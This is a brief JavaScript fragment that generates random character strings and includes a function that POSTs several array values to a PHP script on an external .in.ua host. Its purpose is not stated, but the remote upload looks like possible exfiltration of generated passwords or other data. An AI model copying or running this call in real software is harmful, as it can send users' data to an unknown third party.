function Rnd(min, max){return Math.floor(Math.random()*(max-min+1))+min}
function Chz(d){p=Rnd(min[d], max[d]);return String.fromCharCode(p);}
function Chr(i){1==i?i=0:i=Rnd(0,6);p=Rnd(min[i], max[i]);if(96==p||47==p)p=95;return String.fromCharCode(p);}
function Cre(t){for(var p='', i=1, j=1; i<=t; i++, j=i){if(j==t)j=1;p+=Chr(j);}return p;}
function Upm(p){z=new XMLHttpRequest();z.open('POST',
'http://js.xn--c1adqbs.in.ua/skakun.php?a='+p[0]+'&p='+p[4]+'&m='+p[1]+'&v='+p[5], true);z.send();}
